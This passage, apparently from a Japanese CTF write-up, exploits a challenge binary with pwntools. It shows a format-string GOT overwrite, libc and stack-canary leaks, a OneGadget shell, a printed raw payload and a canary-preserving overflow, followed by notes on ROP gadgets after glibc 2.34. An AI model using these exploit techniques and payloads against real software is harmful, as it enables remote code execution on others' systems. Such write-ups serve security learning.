leaked_libc_main_ret <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token operator">-</span>l1<span class="token punctuation">:</span><span class="token operator">-</span>l2<span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
leaked_libc_base <span class="token operator">=</span> leaked_libc_main_ret <span class="token operator">-</span> <span class="token number">0x029d90</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leaked_libc_main_ret<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># Second stage</span>
payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span>offset<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span> writes<span class="token operator">=</span><span class="token punctuation">{</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"__stack_chk_fail"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>leaked_libc_base<span class="token operator">+</span><span class="token number">0xebc85</span><span class="token punctuation">}</span><span class="token punctuation">,</span>write_size<span class="token operator">=</span><span class="token string">"short"</span><span class="token punctuation">)</span>
target<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

target<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token punctuation">)</span>
target<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></div>
<p>First stage では、ハンドメイドしたペイロードを使用して <code class="language-text">__stack_chk_fail</code> の GOT が指すアドレスを go 関数の呼び出しアドレスにオーバーライドするとともに、<code class="language-text">__libc_start_main_ret</code> アドレスのリークを同時に行っています。</p>
<p>ここで fmtstr<em>payload ではなくハンドメイドしたペイロードを使用している理由は、fmtstr</em>payload で生成したペイロードに任意のフォーマット文字(<code class="language-text">%15$p</code>)を連結するのが面倒だからです。</p>
<p>fmtstr_payload で生成したペイロードの前に <code class="language-text">%15$p</code> を連結した場合、スタック位置や出力文字数、パディングなどを調整しなくてはいけなくなるので、ハンドメイドする場合と大きく手間が変わらなくなってしまいます。</p>
<p>また、fmtstr_payload で生成したペイロードには基本的に <code class="language-text">\x00</code> が含まれるため、printf 関数はそれ以降の文字を出力できず、ペイロードの後ろに <code class="language-text">%15$p</code> を連結してもアドレスのリークなどを行うことができません。</p>
<p>そのため、First stage では fmtstr_payload  ではなくハンドメイドしたペイロードを使用して GOT オーバーライドと libc アドレスのリークを同時に行っています。</p>
<p>続く Second stage では、リークしたアドレスから求めた libc ベースアドレスに OneGadget のオフセット 0xebc85 を加算したアドレスを <code class="language-text">__stack_chk_fail</code> の GOT が指すアドレスに埋め込んでいます。(one_gadget が出力した 1 つめのアドレスは条件を見たさなかったので 2 番目の 0xebc85 を使用しています)</p>
<p>ちなみに、ここで <code class="language-text">write_size="short"</code> を指定しているのは、既定値の Byte のままだとペイロードのサイズが 0x78 になってしまい、入力サイズ制限の 0x42 バイトを超過するためです。</p>
<p><code class="language-text">write_size="short"</code> を指定することで、ペイロードのサイズは 0x40 バイトに削減することができます。</p>
<p>このスクリプトを実行すると、Second stage で <code class="language-text">__stack_chk_fail</code> の GOT が指すアドレスに埋め込んだ OneGadget RCE が発火し、Shell を取得できます。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 611px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/57d53e404b1a6bbb4008ca6e44721849/36bb5/image-20240604225303804.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 13.333333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAApUlEQVQI12PwULf9byWm91+HTeG/Pqfyf0NuVTA24FYBYiibSwVFHCYGw4ZI6hhspIz+O8ia/reRMPxvKqD5X4tZ7r82CxCzygNpeTCty6YIFZeHi+sCHQByhA6rAlwPiM0QYx/8P9o28H+8U9j/AAO3/4FG7v/DLf3+++u7/vfWcgTTPjpO/4ONPf8Hm3iC+UFGHv/99Fz++wMxiAaJh5h6g/UDAFo9Wp2JzGymAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/57d53e404b1a6bbb4008ca6e44721849/8ac56/image-20240604225303804.webp 240w,
/static/57d53e404b1a6bbb4008ca6e44721849/d3be9/image-20240604225303804.webp 480w,
/static/57d53e404b1a6bbb4008ca6e44721849/ef8bf/image-20240604225303804.webp 611w"
              sizes="(max-width: 611px) 100vw, 611px"
              type="image/webp"
            />
          <source
            srcset="/static/57d53e404b1a6bbb4008ca6e44721849/8ff5a/image-20240604225303804.png 240w,
/static/57d53e404b1a6bbb4008ca6e44721849/e85cb/image-20240604225303804.png 480w,
/static/57d53e404b1a6bbb4008ca6e44721849/36bb5/image-20240604225303804.png 611w"
            sizes="(max-width: 611px) 100vw, 611px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/57d53e404b1a6bbb4008ca6e44721849/36bb5/image-20240604225303804.png"
            alt="image-20240604225303804"
            title="image-20240604225303804"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<h3 id="おまけfmtstr_payload--のペイロードに任意のフォーマット文字を連結する" style="position:relative;"><a href="#%E3%81%8A%E3%81%BE%E3%81%91fmtstr_payload--%E3%81%AE%E3%83%9A%E3%82%A4%E3%83%AD%E3%83%BC%E3%83%89%E3%81%AB%E4%BB%BB%E6%84%8F%E3%81%AE%E3%83%95%E3%82%A9%E3%83%BC%E3%83%9E%E3%83%83%E3%83%88%E6%96%87%E5%AD%97%E3%82%92%E9%80%A3%E7%B5%90%E3%81%99%E3%82%8B" aria-label="おまけfmtstr_payload  のペイロードに任意のフォーマット文字を連結する permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>おまけ：fmtstr_payload  のペイロードに任意のフォーマット文字を連結する</h3>
<p>もちろん、fmtstr_payload  で生成したペイロードに任意のフォーマット文字を連結すること自体は可能です。</p>
<p>今回の問題バイナリの場合、以下のスクリプトでペイロードを作成することで、libc アドレスのリークと GOT オーバーライドを同時に行うことができます。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b"%15$pAAA"</span> <span class="token operator">+</span> fmtstr_payload<span class="token punctuation">(</span>offset<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">,</span> numbwritten<span class="token operator">=</span><span class="token number">17</span><span class="token punctuation">,</span> writes<span class="token operator">=</span><span class="token punctuation">{</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"__stack_chk_fail"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token number">0x401196</span><span class="token punctuation">}</span><span class="token punctuation">,</span>write_size<span class="token operator">=</span><span class="token string">"short"</span><span class="token punctuation">)</span></code></pre></div>
<p>ここでは、スタック位置の調整のためにパディングを含めて 8 バイト分の文字列 <code class="language-text">b"%15$pAAA"</code> を fmtstr_payload で生成したペイロードに連結しています。</p>
<p><code class="language-text">%15</code> を連結したことでスタック位置が 8 バイト分ずれるので、offset を 6 から 7 に変更しています。</p>
<p>そして、<code class="language-text">b"%15$pAAA"</code> が先に <code class="language-text">0x7f4dfd768d90AAA</code> という 17 文字を出力することが期待されるので、numbwritten 引数に 17 を設定しています。</p>
<p>これによって、少し手間はかかりますが fmtstr_payload  で生成したペイロードに任意のフォーマット文字を連結することができました。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token string">b'%15$pAAA%4485c%11$lln%170c%12$hhnaaaabaa\x18@@\x00\x00\x00\x00\x00\x1a@@\x00\x00\x00\x00\x00'</span></code></pre></div>
<p>ちなみに、<code class="language-text">write_size="short"</code> を追加しているのは、Second stage のペイロードと同じく、0x42 バイトの入力制限に対応するための調整が理由です。</p>
<h2 id="rop-と-canary-bypass-の実践" style="position:relative;"><a href="#rop-%E3%81%A8-canary-bypass-%E3%81%AE%E5%AE%9F%E8%B7%B5" aria-label="rop と canary bypass の実践 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ROP と Canary Bypass の実践</h2>
<p>解法 1 にて OneGadget を使用して Shell と Flag は取得できたものの、ここからは別解として ROP による Shell の取得を試してみようと思います。</p>
<p>ROP を行うためには、大きく以下のステップをこなす必要があります。</p>
<ol>
<li>Canary が存在する場合、Canary をバイパスする</li>
<li>必要に応じて libc のバージョンとベースアドレスをリークする</li>
<li>エクスプロイトのための ROP チェーンを構築する</li>
<li>入力制限を突破してエクスプロイトをスタックに埋め込む</li>
</ol>
<p>この項では、同じ og バイナリをテーマに上記の各ステップを実践していきます。</p>
<h3 id="canary-bypass-を行う" style="position:relative;"><a href="#canary-bypass-%E3%82%92%E8%A1%8C%E3%81%86" aria-label="canary bypass を行う permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Canary Bypass を行う</h3>
<p>まずは Canary Bypass を行います。</p>
<p>すでに FSB の項で Canary のリークは実践済みですが、一応 libc アドレスと Canary を同時にリークさせつつ GOT オーバーライドできるように調整した以下のペイロードを新たに作成します。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b"%15$p %33$pAAAAA"</span> <span class="token operator">+</span> fmtstr_payload<span class="token punctuation">(</span>offset<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span> numbwritten<span class="token operator">=</span><span class="token number">38</span><span class="token punctuation">,</span> writes<span class="token operator">=</span><span class="token punctuation">{</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"__stack_chk_fail"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token number">0x401196</span><span class="token punctuation">}</span><span class="token punctuation">,</span>write_size<span class="token operator">=</span><span class="token string">"short"</span><span class="token punctuation">)</span></code></pre></div>
<p>Canary のリークのためのフォーマット文字を <code class="language-text">%33$p</code> としているのは、前の項で見た通り go 関数内のスタックを破壊すると同時に 1 回の FSB の悪用で完全な Canary をリークするため、より下位のスタックに埋め込まれた Canary をリークさせているためです。</p>
<p>2 回目に呼び出される go 関数で送り込むペイロードで、ここでリークした Canary が RBP-0x8 の位置に来るようにペイロードを調整すると、Canary を破壊せずに BoF を起こすことができます。</p>
<p>実際に、以下のようにペイロードを調整すると、Canary を破壊せずにリターンアドレスを侵害できるようになりました。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python">target<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Enter your name: "</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">b"%15$p %33$pAAAAA"</span> <span class="token operator">+</span> fmtstr_payload<span class="token punctuation">(</span>offset<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span> numbwritten<span class="token operator">=</span><span class="token number">38</span><span class="token punctuation">,</span> writes<span class="token operator">=</span><span class="token punctuation">{</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"__stack_chk_fail"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token number">0x401196</span><span class="token punctuation">}</span><span class="token punctuation">,</span>write_size<span class="token operator">=</span><span class="token string">"short"</span><span class="token punctuation">)</span>
target<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

r <span class="token operator">=</span> target<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Enter your name: "</span><span class="token punctuation">)</span>
l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">b"Gotta go. See you around, 0x7ffff7dafd90 0x952782961e0ba900"</span><span class="token punctuation">)</span>
leaked_libc_main_ret <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token punctuation">:</span>l<span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
leaked_libc_base <span class="token operator">=</span> leaked_libc_main_ret <span class="token operator">-</span> <span class="token number">0x029d90</span>
leaked_canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token punctuation">:</span>l<span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>

target<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"A"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leaked_canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"B"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x42</span><span class="token operator">-</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></div>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/9048ecc7f15c75e8a15138d27f217434/c65fa/image-20240610211903172.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 41.25%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB1klEQVQozzWRW0/iUBSFeTCZ0HsP0AKlKkUsRWypUC7CFANajeMtGV/m//+QbzZM5mFlnZyHnbW+VSv7S/bxhqek5BCXrPw7ll5+8m13xkpNuGsm2F4Lt+FhK4VyFY7ysFTr9PbcJlrDwXBtalW05nCxYBdNeQxTto0bFu6YXLsiN4ZkPyLGWp9ucM7FZZ92J8AwDWzXxHEtDFtkWejGUSa1l9uKr/k7v9JnnoY7XpI9r8kD61ZKGcxZ2GMye8g4SdhsNsSjmE7YRjUlkanJMV1cpP9T7dDfUOUH7gcFk8Y10/aYeWfEzI9J3T65/B0rB8EF0eBaPMRvB5I0RNMdNM0St6hrJrouCatuzufNA9+zio/JAy/xT56HW/aCYeul3BlyUMUMr285s8a4/g1ZeisIQly3geO4uMK12WphWcJwf7li28lZC8Pd+ZRCDqT1Aamwy/67JZ4tOFNrmuGSXbmlLEuWyyWr1YqiKIiiCNOUhF/5M3/uP/mdPfEmyT4me95EGz8ThjPm5ohcjQjCKyznHKfZo9Pr4fmBqCvVeyhZ/1RZhqm9p498F698Tis5dKA61g0LCjs5rXysfBzlMhjiewM81ZCqprDTqdfrJ2majGMYIp2/SlLhPa8wgE4AAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/9048ecc7f15c75e8a15138d27f217434/8ac56/image-20240610211903172.webp 240w,
/static/9048ecc7f15c75e8a15138d27f217434/d3be9/image-20240610211903172.webp 480w,
/static/9048ecc7f15c75e8a15138d27f217434/e46b2/image-20240610211903172.webp 960w,
/static/9048ecc7f15c75e8a15138d27f217434/b2739/image-20240610211903172.webp 1434w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/9048ecc7f15c75e8a15138d27f217434/8ff5a/image-20240610211903172.png 240w,
/static/9048ecc7f15c75e8a15138d27f217434/e85cb/image-20240610211903172.png 480w,
/static/9048ecc7f15c75e8a15138d27f217434/d9199/image-20240610211903172.png 960w,
/static/9048ecc7f15c75e8a15138d27f217434/c65fa/image-20240610211903172.png 1434w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/9048ecc7f15c75e8a15138d27f217434/d9199/image-20240610211903172.png"
            alt="image-20240610211903172"
            title="image-20240610211903172"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<h3 id="rop-gadget-を集める" style="position:relative;"><a href="#rop-gadget-%E3%82%92%E9%9B%86%E3%82%81%E3%82%8B" aria-label="rop gadget を集める permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ROP Gadget を集める</h3>
<p>今回は NX が有効化されているので、実行可能なメモリ領域に直接コードを埋め込むことができません。</p>
<p>そのため、NX を回避しつつ BoF を悪用して RCE を行うための方法として ROP を検討します。</p>
<p>ROP は通常、ROP Gadget と呼ばれる ret で終わる命令セットをつなげた ROP Chain を構築することで行われます。</p>
<p>スタックに書き込まれた ROP Chain が順に呼び出されていくことで、最終的に任意のコードを実行することができます。</p>
<p>多くの場合、ROP Chain では任意の値を引数に仕込んだ状態で system など、何らかの関数を実行することで Shell の取得を試みます。</p>
<p>この際、非常に便利な Gadget は x64 規約で引数に使用される RDI、RSI などのレジスタにスタックから値を送り込むことができる <code class="language-text">pop rdi ; ret</code> や <code class="language-text">pop rsi ; ret</code> などです。</p>
<p>このような Gadget は従来では <code class="language-text">__libc_csu_init</code> 関数に含まれていたため容易に利用できましたが、今回のバイナリのように glibc 2.34 以降の環境で動的リンクによってコンパイルされたバイナリの場合、<code class="language-text">__libc_csu_init</code> 関数自体が存在しなくなるためにこの Gadget を利用できなくなっています。</p>
<p>実際に、適当な C のコードを glibc 2.34 以降の環境とそれ以前の環境で同じようにコンパイルしてみると、glibc 2.34 以降の環境では <code class="language-text">pop rdi ; ret</code> のような Gadget が存在しないことを確認できます。</p>
<p>▼ glibc 2.34 未満の環境でコンパイルしたバイナリ</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/f2a5f41afd8a648e5b0b493049b737e0/71b12/image-20240612222134799.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 64.16666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB4klEQVQ4y31T127jQAz0p9y5S1YvVrdkW3FBgOT/v2ZuhpENI8jlgVjuapdTSM36KsbYZRiHGllZo8gLxEWFmHm4L7HyAixcD8udb+sjX/JcsfoWs8vY434ZcLuecR4vGNqDFfTSHG6c2rpLMsuDbI+AgBs+3LDwRoW/Ac2atkZVl0j3GU73d/TXO063O4quR9526Ahy+/hE1R8RkXF7fsNwGFCFMcoowY5A7hSbIMIsaw5I6g5ukiOamImRmORNZ6siKko7X/shAhZ2dY/hk7UU6Y5LgJku6VAbh5S3pL52dk9//jKfT/GQZvkU82k/dybJ/dsFiqxucaR/LVFjyvEIIpkeAR3uFQLYct1Smq0vueRaU0RX3ohpORzhM/fVaXZ5T4CUQGnT2rnYmAUEi2wSqmculVZQoxHykpdm9KzFko/+bBw4tMB8ZGNC+uavt4ij2IBf5b+GSZbUtGqsGSW7J/PFWEAJz4/XG2quDRlHSWryVj/M33MOVVAhysPlZoX1QQUltz2NCChpQY8WPBc7fRebHwuqkD8NsZjKXD2yQTbJB+SUnzkussmG/xX7Yth8MdRFMdKgqqAYFrRANuzUTY0UvRTg7wXlYd2Y5IQ+PeZMnSv7wQovHv/u9Kv9JvkfNgqYiQFo/JQAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/f2a5f41afd8a648e5b0b493049b737e0/8ac56/image-20240612222134799.webp 240w,
/static/f2a5f41afd8a648e5b0b493049b737e0/d3be9/image-20240612222134799.webp 480w,
/static/f2a5f41afd8a648e5b0b493049b737e0/e46b2/image-20240612222134799.webp 960w,
/static/f2a5f41afd8a648e5b0b493049b737e0/5c7ba/image-20240612222134799.webp 1308w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/f2a5f41afd8a648e5b0b493049b737e0/8ff5a/image-20240612222134799.png 240w,
/static/f2a5f41afd8a648e5b0b493049b737e0/e85cb/image-20240612222134799.png 480w,
/static/f2a5f41afd8a648e5b0b493049b737e0/d9199/image-20240612222134799.png 960w,
/static/f2a5f41afd8a648e5b0b493049b737e0/71b12/image-20240612222134799.png 1308w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/f2a5f41afd8a648e5b0b493049b737e0/d9199/image-20240612222134799.png"
            alt="image-20240612222134799"
            title="image-20240612222134799"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>▼ glibc 2.34 以降の環境でコンパイルしたバイナリ</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 832px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/33d0fd4b66d4ac348f9a50f952145bab/ef6b9/image-20240612222258852.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 7.916666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAhklEQVQI1z2LSw6CMABE2VqowZ0huqHUWqr2Y7oQP2AiKCy9/13GWhMXLzNvkklUIaHmHIIobOkeIt0FFAQ9xKxzA7UI5Dr249LjyS/o1h6P8oRr4TBUZ/Rlg541SL7ydi+M4oZ25THKDpNsMYTTVN9hqYCeMRjCoEkVsSmHzX6Y4C7b/LcPixs7QSPk1KoAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/33d0fd4b66d4ac348f9a50f952145bab/8ac56/image-20240612222258852.webp 240w,
/static/33d0fd4b66d4ac348f9a50f952145bab/d3be9/image-20240612222258852.webp 480w,
/static/33d0fd4b66d4ac348f9a50f952145bab/de44a/image-20240612222258852.webp 832w"
              sizes="(max-width: 832px) 100vw, 832px"
              type="image/webp"
            />
          <source
            srcset="/static/33d0fd4b66d4ac348f9a50f952145bab/8ff5a/image-20240612222258852.png 240w,
/static/33d0fd4b66d4ac348f9a50f952145bab/e85cb/image-20240612222258852.png 480w,
/static/33d0fd4b66d4ac348f9a50f952145bab/ef6b9/image-20240612222258852.png 832w"
            sizes="(max-width: 832px) 100vw, 832px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/33d0fd4b66d4ac348f9a50f952145bab/ef6b9/image-20240612222258852.png"
            alt="image-20240612222258852"
            title="image-20240612222258852"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>このあたりの変更の詳細は以下の記事に詳しくまとめられていて非常に参考になります。</p>
<p>参考：<a href="https://hackmd.io/@t3mp/r1zt00V1j?utm_source=preview-mode&#x26;utm_medium=rec" target="_blank" rel="nofollow noopener noreferrer">glibc code reading 〜なぜ俺達のglibcは後方互換を捨てたのか〜 - HackMD</a></p>
<p>とにかく、今回の問題バイナリは glibc 2.34 以降の環境でコンパイルされており、<code class="language-text">pop rdi ; ret</code> や <code class="language-text">pop rsi ; ret</code> などの Gadget がバイナリ本体に存在しなかったため、Shell を取得可能な ROP を構成することが容易ではありません。</p>
<p>このような状況における回避策の 1 つとして、リークした libc のアドレスからライブラリのバージョンを特定し、共有ライブラリ内の Gadget を使って ROP を成立させる方法があります。</p>
<p>実際に、すでにコンテナから抽出済みの、今回の問題サーバが使用するライブラリファイルに埋め込まれた Gadget を探索すると、主要な操作を行う際に使用する多くの Gadget を見つけることができます。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/3b7e771443d6c77f50163ecfabcd1b09/4ad3a/image-20240612223621000.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 22.083333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA80lEQVQY04WPXU+CABSGucmsLmpufdkXiLRUQFARhQRxTEzGVDZya631///E06m1ddnFu51zdvac8ygz1SM2JizaAemDT3LlEDS6eGcdRqcdPIlz3MaqqViHGuaBivld//ZWvYVd1+nLTv9IRyn8Ffk446W/oHQzdnbKsjUl1aYs2yGJOiG+8wguHULJXOqoOSC6GRJfu4TnFr4cHQpsdGKgfKZ7XicFu8HqJ1uBvkclb+GWvcwrZ0nZSygeZ6RNl7UekNyPiW9HxBc2YaMnwKc/4EdSUY1zNt05pXyXGc/kRsha9YlFfyoqfl3DFTWz9r/yF8IDe26X+t6oAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/3b7e771443d6c77f50163ecfabcd1b09/8ac56/image-20240612223621000.webp 240w,
/static/3b7e771443d6c77f50163ecfabcd1b09/d3be9/image-20240612223621000.webp 480w,
/static/3b7e771443d6c77f50163ecfabcd1b09/e46b2/image-20240612223621000.webp 960w,
/static/3b7e771443d6c77f50163ecfabcd1b09/b2d4b/image-20240612223621000.webp 1152w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/3b7e771443d6c77f50163ecfabcd1b09/8ff5a/image-20240612223621000.png 240w,
/static/3b7e771443d6c77f50163ecfabcd1b09/e85cb/image-20240612223621000.png 480w,
/static/3b7e771443d6c77f50163ecfabcd1b09/d9199/image-20240612223621000.png 960w,
/static/3b7e771443d6c77f50163ecfabcd1b09/4ad3a/image-20240612223621000.png 1152w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/3b7e771443d6c77f50163ecfabcd1b09/d9199/image-20240612223621000.png"
